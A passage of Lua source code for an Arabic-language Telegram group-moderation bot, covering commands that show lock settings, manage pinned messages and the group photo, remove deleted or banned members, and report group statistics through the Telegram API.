if text == "الملصقات" then if DevJoker:get(BlAcK..'Joker:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الملصقات ↫ "..lock_sticker.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الصور" then if DevJoker:get(BlAcK..'Joker:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الصور ↫ "..mute_photo.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevJoker:get(BlAcK..'Joker:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الفيديو ↫ "..mute_video.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الاونلاين" then if DevJoker:get(BlAcK..'Joker:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local BlAcKTeam = "\n" .."᥀︙الاونلاين ↫ "..mute_in.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الدردشه" then if DevJoker:get(BlAcK..'Joker:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الدردشه ↫ "..mute_text.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local BlAcKTeam = "\n" .."᥀︙التوجيه ↫ "..lock_forward.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الاغاني" then if DevJoker:get(BlAcK..'Joker:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الاغاني ↫ "..mute_music.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevJoker:get(BlAcK..'Joker:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local BlAcKTeam = "\n" .."᥀︙الصوت ↫ "..mute_voice.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevJoker:get(BlAcK..'Joker:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الجهات ↫ "..lock_contact.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الماركداون" then if DevJoker:get(BlAcK..'Joker:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local BlAcKTeam = "\n" .."᥀︙الماركداون ↫ "..markdown.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الهاشتاك" then if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local BlAcKTeam = "\n" .."᥀︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "التعديل" then if DevJoker:get(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local BlAcKTeam = "\n" .."᥀︙التعديل ↫ "..mute_edit.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "التثبيت" then if DevJoker:get(BlAcK..'Joker:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local BlAcKTeam = "\n" .."᥀︙التثبيت ↫ "..lock_pin.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الاشعارات" then if DevJoker:get(BlAcK..'Joker:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الكلايش" then if DevJoker:get(BlAcK..'Joker:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الكلايش ↫ "..lock_spam.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الدخول" then if DevJoker:get(BlAcK..'Joker:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local BlAcKTeam = "\n" .."᥀︙الدخول ↫ "..lock_Join.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الشبكات" then if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الشبكات ↫ "..lock_wp.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "المواقع" then if DevJoker:get(BlAcK..'Joker:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙المواقع ↫ "..lock_location.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "العربيه" then if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙العربيه ↫ "..lock_arabic.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الانكليزيه" then if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الانكليزيه ↫ "..lock_english.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الكفر" then if DevJoker:get(BlAcK..'Joker:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local BlAcKTeam = "\n" .."᥀︙الكفر ↫ "..lock_kaf.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الفشار" then if DevJoker:get(BlAcK..'Joker:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local BlAcKTeam = "\n" .."᥀︙الفشار ↫ "..lock_fshar.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "الطائفيه" then if DevJoker:get(BlAcK..'Joker:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local BlAcKTeam = "\n" .."᥀︙الطائفيه ↫ "..lock_taf.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
end
--     Source BlAcK     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل كشف الاعدادات'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل كشف الاعدادات'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:LockSettings'..msg.chat_id_) 
end
--     Source BlAcK     --
if text and (text == 'تعطيل التحقق' or text == 'قفل التحقق' or text == 'تعطيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل التحقق بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:Robot'..msg.chat_id_)
end
if text and (text == 'تفعيل التحقق' or text == 'فتح التحقق' or text == 'تفعيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل التحقق بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:Robot'..msg.chat_id_,true)
end
--     Source BlAcK     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل ردود المدير'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل ردود المدير'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:GpRed'..msg.chat_id_,true)
end
--     Source BlAcK     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل ردود المطور'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل ردود المطور'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:AllRed'..msg.chat_id_,true)
end
--     Source BlAcK     --
if JokerSudo(msg) then
if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره ᥀' and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل المغادره بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Left:Bot"..BlAcK)
end
if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره ᥀' and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل المغادره بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Left:Bot"..BlAcK,true) 
end 
if text == 'تفعيل الاذاعه' or text == '↫ تفعيل الاذاعه ᥀' and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الاذاعه بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Send:Bot"..BlAcK)
end
if text == 'تعطيل الاذاعه' or text == '↫ تعطيل الاذاعه ᥀' and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الاذاعه بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Send:Bot"..BlAcK,true) 
end
end
--     Source BlAcK     --
if text and text:match("^ضع اسم (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"᥀︙البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات")  
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تغير اسم المجموعه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
end,nil) 
end
--     Source BlAcK     --
if msg.content_.photo_ then
if DevJoker:get(BlAcK..'Joker:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"᥀︙عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
DevJoker:del(BlAcK..'Joker:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevJoker:del(BlAcK..'Joker:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تغير صورة المجموعه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
end,nil) 
DevJoker:del(BlAcK..'Joker:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
Dev_Joker(msg.chat_id_,msg.id_, 1, '᥀︙ارسل صورة المجموعه الان', 1, 'md')
DevJoker:set(BlAcK..'Joker:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source BlAcK     --
if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف صورة المجموعه")  
return false  
end
--     Source BlAcK     --
if Manager(msg) then
if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
if DevJoker:sismember(BlAcK.."Joker:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Joker(msg.chat_id_,msg.id_, 1, "᥀︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
DevJoker:del(BlAcK..'Joker:PinnedMsg'..msg.chat_id_)
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم الغاء تثبيت الرساله'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"᥀︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"᥀︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source BlAcK     --
if text and text:match("^الغاء تثبيت الكل$") and ChCheck(msg) then  
if DevJoker:sismember(BlAcK.."Joker:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Joker(msg.chat_id_,msg.id_, 1, "᥀︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم الغاء تثبيت الكل'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"᥀︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"᥀︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source BlAcK     --
if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
if DevJoker:sismember(BlAcK.."Joker:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Joker(msg.chat_id_,msg.id_, 1, "᥀︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local PinId = DevJoker:get(BlAcK..'Joker:PinnedMsg'..msg.chat_id_)
if PinId then
Pin(msg.chat_id_,PinId,0)
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم اعادة تثبيت الرساله'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end end
end
--     Source BlAcK     --
if text == 'طرد المحذوفين' and ChCheck(msg) or text == 'مسح المحذوفين' and ChCheck(msg) or text == 'طرد الحسابات المحذوفه' and ChCheck(msg) or text == 'حذف المحذوفين' and ChCheck(msg) then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم طرد المحذوفين")  
end,nil)
end
--     Source BlAcK     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) or text and text:match("^مسح المطرودين$") or text and text:match("^حذف المطرودين$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_Joker(msg.chat_id_, msg.id_, 0,'᥀︙*لا يوجد محظورين*', 1, 'md')
DevJoker:del(BlAcK..'Joker:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
DevJoker:del(BlAcK..'Joker:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المحظورين")  
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
--     Source BlAcK     --
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
local Muted = DevJoker:scard(BlAcK.."Joker:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه ↫ ❨ '..dp.title_..' ❩\n᥀︙الايدي ↫ ❨ '..msg.chat_id_..' ❩\n᥀︙عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n᥀︙عدد الادمنيه ↫ ❨ *'..data.administrator_count_..'* ❩\n᥀︙عدد المطرودين ↫ ❨ *'..data.kicked_count_..'* ❩\n᥀︙عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n᥀︙عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n', 1, 'md') 
end,nil)
end,nil)
end
--     Source BlAcK     --
if text and text:match('^كشف (-%d+)') and ChCheck(msg) then
local ChatId = text:match('كشف (-%d+)') 
if not SudoBot(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطورين فقط', 1, 'md')
else
local ConstructorList = DevJoker:scard(BlAcK.."Joker:Constructor:"..ChatId) or 0
local BanedList = DevJoker:scard(BlAcK.."Joker:Ban:"..ChatId) or 0
local ManagerList = DevJoker:scard(BlAcK.."Joker:Managers:"..ChatId) or 0
local MutedList = DevJoker:scard(BlAcK.."Joker:Muted:"..ChatId) or 0
local TkeedList = DevJoker:scard(BlAcK.."Joker:Joker:Tkeed:"..ChatId) or 0
local AdminsList = DevJoker:scard(BlAcK.."Joker:Admins:"..ChatId) or 0
local VipList = DevJoker:scard(BlAcK.."Joker:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/BLACK_TEAM_4' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,Joker) 
if Joker.first_name_ ~= false then
ConstructorJoker = "["..Joker.first_name_.."](T.me/"..(Joker.username_ or "BLACK_TEAM_4")..")"
else 
ConstructorJoker = "حساب محذوف"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙المجموعه ↫ ["..dp.title_.."]("..LinkGroup..")\n᥀︙الايدي ↫ ( `"..ChatId.."` )\n᥀︙المنشئ ↫ "..ConstructorJoker.."\n᥀︙عدد المدراء ↫ ( *"..ManagerList.."* )\n᥀︙عدد المنشئين ↫ ( *"..ConstructorList.."* )\n᥀︙عدد الادمنيه ↫ ( *"..AdminsList.."* )\n᥀︙عدد المميزين ↫ ( *"..VipList.."* )\n᥀︙عدد المحظورين ↫ ( *"..BanedList.."* )\n᥀︙عدد المقيدين ↫ ( *"..TkeedList.."* )\n᥀︙عدد المكتومين ↫ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
end
--     Source BlAcK     --
if text and text:match("^غادر (-%d+)$") and ChCheck(msg) then
local Text = { string.match(text, "^(غادر) (-%d+)$")}
if not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙المجموعه ↫ ["..dp.title_.."]\n᥀︙تمت المغادره منها بنجاح", 1, "md")
Dev_Joker(Text[2], 0, 1, "᥀︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
ChatLeave(dp.id_, BlAcK)
DevJoker:srem(BlAcK.."Joker:Groups", dp.id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end 
end,nil)
end 
end
--     Source BlAcK     --
if text and text:match("^تعين عدد الاعضاء (%d+)$") and SecondSudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and SecondSudo(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
DevJoker:set(BlAcK..'Joker:Num:Add:Bot',Num) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
end
--     Source BlAcK     --
if text == 'تفعيل البوت الخدمي' and ChCheck(msg) or text == '↫ تفعيل البوت الخدمي ᥀' and ChCheck(msg) then 
if not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط', 1, 'md')
else 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل البوت الخدمي'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:FreeBot'..BlAcK) 
end 
end
if text == 'تعطيل البوت الخدمي' and ChCheck(msg) or text == '↫ تعطيل البوت الخدمي ᥀' and ChCheck(msg) then 
if not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط', 1, 'md')
else 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل البوت الخدمي'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:FreeBot'..BlAcK,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تعطيل صورتي' and Manager(msg) and ChCheck(msg) then   
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل صورتي بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل صورتي بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الالعاب بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الالعاب بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:Games'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب المتطوره' and Manager(msg) and ChCheck(msg) or text == 'تفعيل الالعاب الاحترافيه' and Manager(msg) and ChCheck(msg) then   
